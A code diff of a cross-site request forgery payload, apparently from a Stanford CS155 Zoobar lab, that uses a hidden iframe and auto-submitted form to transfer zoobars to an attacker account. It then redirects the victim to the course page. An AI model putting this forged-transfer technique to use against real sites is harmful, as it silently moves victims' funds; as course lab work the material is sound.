@@ -58,12 +58,14 @@
 			var egg_stanford = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
 				"<form id='transferForm' action='http://zoobar.stanford.edu/transfer.php' method='POST' target='innerFrame'>" +
 				"<input type='text' name='zoobars' value='10'>" +
-				"<input type='text' name='recipient' value='attacker'>" +
+				"<input type='text' name='recipient' value='alamo_attacker'>" +
 				"<input type='text' name='submission' value='Send'>" +
 				"</form>";
 
 			// TODO: need to change localhost to zoobar.stanford.edu
 			// TODO: test on OSX firefox on zoobar.stanford.edu
+			// TODO: change alamo_attacker to attacker in stanford egg
+			// TODO: change attack to use asynchronous AJAX 
 
 			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
 			
@@ -84,7 +86,7 @@
 			transferForm.submit();
 			
 			/* Wait 50ms for POST to succeed and redirect to crypto.stanford.edu/cs155 */
-			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
+			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 100 );
 		//]]>
 		</script>
 		
